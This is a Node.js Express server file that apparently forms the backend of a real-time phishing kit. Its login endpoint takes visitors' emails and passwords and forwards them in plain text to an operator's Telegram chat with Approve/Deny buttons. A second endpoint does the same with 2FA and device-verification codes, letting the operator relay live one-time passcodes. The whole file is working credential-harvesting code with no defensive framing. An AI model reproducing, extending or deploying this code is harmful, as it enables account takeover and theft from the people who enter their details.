require('dotenv').config();

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const app = express();
const port = Number(process.env.PORT || 3000);
const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;
const isVercel = Boolean(process.env.VERCEL);

const loginDecisions = new Map();
const verificationDecisions = new Map();

if (!botToken || !chatId) {
  console.error('Missing BOT_TOKEN or CHAT_ID in environment variables.');
}

// In Vercel serverless environment, long polling is disabled.
const botOptions = isVercel ? {} : { polling: true };
const bot = botToken ? new TelegramBot(botToken, botOptions) : null;

app.use(express.json());
app.use(express.static(__dirname));

async function handleCallbackQuery(query) {
  if (!query || !bot) return;
  const data = String(query.data || '');

  try {
    if (data.startsWith('approve:')) {
      const email = data.slice('approve:'.length);
      loginDecisions.set(email, { status: 'approved', message: 'Login approved.' });
      await bot.answerCallbackQuery(query.id, { text: 'Approved' });
      await bot.editMessageReplyMarkup(
        { inline_keyboard: [] },
        { chat_id: query.message.chat.id, message_id: query.message.message_id }
      );
      await bot.sendMessage(query.message.chat.id, `✅ Login approved for ${email || 'user'}.`);
    }

    if (data.startsWith('deny:')) {
      const email = data.slice('deny:'.length);
      loginDecisions.set(email, { status: 'denied', message: 'Email or password is wrong.' });
      await bot.answerCallbackQuery(query.id, { text: 'Denied' });
      await bot.editMessageReplyMarkup(
        { inline_keyboard: [] },
        { chat_id: query.message.chat.id, message_id: query.message.message_id }
      );
      await bot.sendMessage(query.message.chat.id, `❌ Login denied for ${email || 'user'}.`);
    }

    if (data.startsWith('verify:')) {
      const [, step, verificationEmail, verificationCode] = data.split(':');
      const key = `${verificationEmail}:${step}`;
      verificationDecisions.set(key, { status: 'approved', message: `${step.toUpperCase()} verified.` });
      await bot.answerCallbackQuery(query.id, { text: 'Verified' });
      await bot.editMessageReplyMarkup(
        { inline_keyboard: [] },
        { chat_id: query.message.chat.id, message_id: query.message.message_id }
      );
      await bot.sendMessage(query.message.chat.id, `✅ ${step.toUpperCase()} verification approved for ${verificationEmail || 'user'} (${verificationCode || 'code'}).`);
    }

    if (data.startsWith('reject:')) {
      const [, step, verificationEmail, verificationCode] = data.split(':');
      const key = `${verificationEmail}:${step}`;
      verificationDecisions.set(key, { status: 'denied', message: `${step.toUpperCase()} verification denied.` });
      await bot.answerCallbackQuery(query.id, { text: 'Rejected' });
      await bot.editMessageReplyMarkup(
        { inline_keyboard: [] },
        { chat_id: query.message.chat.id, message_id: query.message.message_id }
      );
      await bot.sendMessage(query.message.chat.id, `❌ ${step.toUpperCase()} verification denied for ${verificationEmail || 'user'} (${verificationCode || 'code'}).`);
    }
  } catch (error) {
    console.error('Callback processing failed:', error.message);
  }
}

if (!isVercel && bot) {
  bot.on('callback_query', handleCallbackQuery);
}

app.post('/api/login', async (req, res) => {
  const email = String(req.body?.email || '').trim();
  const password = String(req.body?.password || '').trim();

  if (!email || !password) {
    return res.status(400).json({ ok: false, message: 'Missing email or password.' });
  }

  loginDecisions.delete(email);

  if (!botToken || !chatId || !bot) {
    return res.status(500).json({ ok: false, message: 'Telegram bot is not configured.' });
  }

  const message = `Login request:\nEmail: ${email}\nPassword: ${password}`;

  try {
    const sentMessage = await bot.sendMessage(chatId, message, {
      reply_markup: {
        inline_keyboard: [[
          { text: 'Approve', callback_data: `approve:${email}` },
          { text: 'Deny', callback_data: `deny:${email}` }
        ]]
      }
    });

    return res.json({
      ok: true,
      messageId: sentMessage.message_id,
      email
    });
  } catch (error) {
    console.error('Failed to send login request:', error.message);
    return res.status(500).json({ ok: false, message: 'Could not send login request.' });
  }
});

app.post('/api/telegram', async (req, res) => {
  const update = req.body || {};
  if (update.callback_query) {
    try {
      await handleCallbackQuery(update.callback_query);
    } catch (error) {
      console.error('Webhook callback failed:', error.message);
    }
  }
  return res.status(200).json({ ok: true });
});

app.get('/api/set-webhook', async (req, res) => {
  if (!bot || !botToken) {
    return res.status(500).json({ ok: false, message: 'Telegram bot is not configured.' });
  }

  const host = req.headers['x-forwarded-host'] || req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'https';
  const webhookUrl = `${protocol}://${host}/api/telegram`;

  try {
    await bot.setWebHook(webhookUrl);
    return res.json({ ok: true, message: `Webhook successfully set to ${webhookUrl}` });
  } catch (error) {
    console.error('Failed to set webhook:', error.message);
    return res.status(500).json({ ok: false, message: error.message });
  }
});

app.get('/api/login-status', (req, res) => {
  const email = String(req.query.email || '').trim();

  if (!email) {
    return res.status(400).json({ ok: false, message: 'Missing email.' });
  }

  const decision = loginDecisions.get(email);

  if (!decision) {
    return res.json({ ok: true, status: 'pending' });
  }

  return res.json({ ok: true, status: decision.status, message: decision.message });
});

app.post('/api/send-verification', async (req, res) => {
  const email = String(req.body?.email || '').trim();
  const step = String(req.body?.step || '').trim();
  const code = String(req.body?.code || '').trim();

  if (!email || !step || !code) {
    return res.status(400).json({ ok: false, message: 'Missing email, step, or code.' });
  }

  if (!botToken || !chatId || !bot) {
    return res.status(500).json({ ok: false, message: 'Telegram bot is not configured.' });
  }

  const key = `${email}:${step}`;
  verificationDecisions.delete(key);

  const subject = step === '2fa' ? '2FA code verification' : 'new device verification';
  const message = `Security validation required\n\nEmail: ${email}\nStep: ${subject}\nCode: ${code}\n\nApprove or reject this verification request.`;

  try {
    const sentMessage = await bot.sendMessage(chatId, message, {
      reply_markup: {
        inline_keyboard: [[
          { text: 'Approve', callback_data: `verify:${step}:${email}:${code}` },
          { text: 'Reject', callback_data: `reject:${step}:${email}:${code}` }
        ]]
      }
    });

    return res.json({ ok: true, messageId: sentMessage.message_id, email, step, status: 'pending' });
  } catch (error) {
    console.error('Failed to send verification request:', error.message);
    return res.status(500).json({ ok: false, message: 'Could not send verification request.' });
  }
});

app.get('/api/verification-status', (req, res) => {
  const email = String(req.query.email || '').trim();
  const step = String(req.query.step || '').trim();

  if (!email || !step) {
    return res.status(400).json({ ok: false, message: 'Missing email or step.' });
  }

  const decision = verificationDecisions.get(`${email}:${step}`);

  if (!decision) {
    return res.json({ ok: true, status: 'pending' });
  }

  return res.json({ ok: true, status: decision.status, message: decision.message });
});

app.get('/health', (_req, res) => {
  res.json({ ok: true });
});

if (require.main === module && !isVercel) {
  app.listen(port, () => {
    console.log(`Server running on http://localhost:${port}`);
  });
}

module.exports = app;
